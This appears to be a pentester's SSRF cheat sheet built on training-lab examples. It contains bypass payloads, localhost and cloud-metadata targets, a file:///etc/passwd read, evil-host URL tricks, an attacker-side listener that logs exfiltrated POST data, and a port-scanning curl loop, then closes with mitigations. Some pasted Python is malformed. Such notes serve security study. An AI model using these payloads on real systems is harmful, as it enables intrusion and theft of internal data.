# SSRF

{% code overflow="wrap" fullWidth="true" %}
```bash
https://portswigger.net/web-security/ssrf
https://pentestbook.six2dez.com/enumeration/web/ssrf
https://github.com/tarunkant/Gopherus
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery

# Bypass
Double-URL encode the blacklisted stuff
http://SuB.DoMain.CoM
http://sub.domain.com
http://SUB.DOMAIN.COM
ftp://user:password@host:port/
# Tricky way to bypass filters
Point to a file we host and include on that file the basic headers that the server expects:
HTTP/1.1 STATUS_CODE MESSAGE
Location: $WHAT_WE_WANT_TO_ACCESS_OR_DISCLOSE
```
{% endcode %}

## What is SSRF?

Server-side request forgery is a web security vulnerability that allows an attacker to cause the server-side application to make requests to an unintended location (internal-only services, arbitrary external systems...). This could leak sensitive data.

## What is the impact of SSRF attacks?

In some situations, even RCE.

## Common SSRF attacks

{% code overflow="wrap" fullWidth="true" %}
```sh
######### SSRF attacks against the server
127.0.0.1
localhost
# Example of shop showing stock by quering an API
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
# Exploitation
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://localhost/admin


########## SSRF attacks against other back-end systems
These systems often have non-routable private IP addresses.
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://192.168.0.68/admin
EXAMPLE: Fuzz/enum internal network 192.168.0.X to find 192.168.0.X/admin interface
```
{% endcode %}

## Circumventing common SSRF defenses

{% code overflow="wrap" fullWidth="true" %}
```sh
######### SSRF with blacklist-based input filters
127.0.0.1 -> localhost 2130706433 017700000001 127.1
Register your own domain name that resolves to 127.0.0.1. You can use spoofed.burpcollaborator.net for this purpose. 
Obfuscate blocked strings using URL encoding or case variation -> http%3a//  aDmin 
Provides URL you control which redirects to target url (switching from an http: to https: URL during the redirect 
has been shown to bypass some anti-SSRF filters)


########## SSRF with whitelist-based input filters
# You can embed credentials in a URL before the hostname, using the @ character. For example:
https://expected-host:fakepassword@evil-host
# You can use the # character to indicate a URL fragment. For example:
https://evil-host#expected-host
# You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example:
https://expected-host.evil-host
# You can URL-encode characters to confuse the URL-parsing code, also double URL encoding
# You can use combinations of these techniques together. 


########### Bypassing SSRF filters via open redirection
/product/nextProduct?currentProductId=6&path=http://evil-user.net
#  returns a redirection to:
http://evil-user.net
# Leverage open redirection to bypass the URL filter on another request and exploit SSRF:
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
EXAMPLE: find a request with path/url (Open Redirection vulnerability) and use that URI request
for a different request w/ parameters similar to the previous one that would accept it.
```
{% endcode %}

## Blind SSRF vulnerabilities

When you can issue a back-end HTTP request to a supplied URL, but the response from the back-end request is not returned in the application's front-end response.

Harder to exploit but sometimes leads to RCE on the server.

from http.server import SimpleHTTPRequestHandler, HTTPServer\
from urllib.parse import unquote\
class CustomRequestHandler(SimpleHTTPRequestHandler):

{% code overflow="wrap" fullWidth="true" %}
```sh
# BLIND SSRF SCRIPT
def end_headers(self):
    self.send_header('Access-Control-Allow-Origin', '*')  # Allow requests from any origin
    self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
    self.send_header('Access-Control-Allow-Headers', 'Content-Type')
    super().end_headers()

def do_GET(self):
    self.send_response(200)
    self.end_headers()
    self.wfile.write(b'Hello, GET request!')

def do_POST(self):
    content_length = int(self.headers['Content-Length'])
    post_data = self.rfile.read(content_length).decode('utf-8')

    self.send_response(200)
    self.end_headers()

    # Log the POST data to data.html
    with open('data.html', 'a') as file:
        file.write(post_data + '\n')
    response = f'THM, POST request! Received data: {post_data}'
    self.wfile.write(response.encode('utf-8'))
    
if name == 'main':
server_address = ('', 8080)
httpd = HTTPServer(server_address, CustomRequestHandler)
print('Server running on http://localhost:8080/')
httpd.serve_forever()
Execute it
chmod +x server.py && python3 server.py
Then input our IP and port on the vulnerable field
/profile.php?url=http://ATTACKING_IP:8080
```
{% endcode %}

### What is the impact of blind SSRF vulnerabilities?

Often lower than fully informed SSRF because you cannot retrive data but sometimes -> RCE.

### How to find and exploit blind SSRF vulnerabilities

Out-of-band (OAST) -> trigger an HTTP request to an external system that you control.

NOTE: It is relatively common for infrastructure to allow outbound DNS traffic, since this is needed for so many purposes, but block HTTP connections to unexpected destinations (common to see DNS traffic on Collaborator but not subsequent HTTP requests).

You can blindly sweep the internal IP address space, sending payloads designed to detect well-known vulnerabilities on an unpatched internal server.

Another avenue is to induce the app to connect to a system under the attacker's control, and return malicious responses. If you can exploit a serious client-side vulnerability in the server's HTTP implementation, you might be able to achieve RCE within the app infrastructure.

EXAMPLE: **Referer header** when product is loaded / Goal: use this to cause HTTP on Burp Collaborator.

## Finding hidden attack surface for SSRF vulnerabilities

{% code overflow="wrap" fullWidth="true" %}
```sh
# Partial URLs in requests
Sometimes, an application places only a hostname or part of a URL path into request parameters.
However, exploitability as full SSRF might be limited because you do not control the entire URL that gets requested. 

# URLs within data formats
Some apps transmit data in formats that allows the inclusion of URLs that might get requested by the data parser.
Example: When apps accept XML and parses it, it might be vulnerable to XXE. It might also be vulnerable to SSRF via XXE.

# SSRF via the Referer header
Some apps use server-side analytics software to tracks visitors and visit 3rd-party URLs that appear in the Referer header.
As a result, the Referer header is often a useful attack surface for SSRF vulnerabilities. 
```
{% endcode %}

{% code overflow="wrap" fullWidth="true" %}
```bash
1 Hacker requests http://website.thm/stock?server=api.website.thm/api/user&x=&id=12
2 Website reuqrests http://api.website.thm/api/user?x=.website.thm/api/stock/item?id=123
#  Take note of the payload ending in &x= being used to stop the remaining path from being appended to the end of the attacker's URL and instead turns it into a parameter (?x=) on the query string.
The attacker can request one of their servers he/she controls to capture request headers and maybe auth credentials or API keys
# Check how the parameter is reflected on the request URL
```
{% endcode %}

## SSRF Payloads

{% hint style="info" %}
Another option is to manipulate special IP addresses that we can find on the web/source code (like 192.168.x.x or 10.x.x.x for IPv4) or domain names (e.g., internal-database.hrms.thm). We could use then to access internal resources such as IP/admin.php
{% endhint %}

{% code overflow="wrap" fullWidth="false" %}
```bash
http://127.0.0.1:3306
127.0.0.1
0
0.0.0.0
0000
127.1
127.*.*.*
2130706433
017700000001
127.0.0.1.nip.io.
http://[::]:3306
http://:::3306
0x7f000001

# Convert IP to hex or decimal format
https://gist.github.com/mzfr/fd9959bea8e7965d851871d09374bb72

# Reading files
file:///etc/passwd

# In case there is a path to append and other parameters we have to break
127.0.0.1/admin&id=435
127.0.0.1/admin#&id=435
127.0.0.1/admin%23&id=435

# Cloud environment
169.254.169.254
registering a subdomain on their own domain with a DNS record that points to the IP Address 169.254.169.254

If allow list begins with https://website.thm, An  attacker could create a subdomain  https://website.thm.attackers-domain.thm

OPEN REDIRECT
```
{% endcode %}

## SSRF to RCE

[https://github.com/tarunkant/Gopherus](https://github.com/tarunkant/Gopherus)

## Check open ports on localhost

{% code overflow="wrap" fullWidth="true" %}
```bash
for x in {1..65535}; do cmd=$(curl -so /dev/null http://MACHINE_IP:8000/attack?url=http://2130706433:${x} \
        -w '%{size_download}'); 
        
        if [ $cmd != 1045 ]; then 
                echo "Open port: $x" 
        fi
done
```
{% endcode %}

## Mitigation

To prevent SSRF exploitation, the following mitigations are suggested:

* Employing strict input validation and sanitisation to prevent malicious input.
* Using allow lists to control which domains and IPs the application can access.
* Applying network segmentation to restrict requests to authorised resources.
* Following the principle of least privilege, granting the minimum permissions required for system operations.
* **Implement security headers**, such as Content-Security-Policy, that restricts the application's load of external resources.
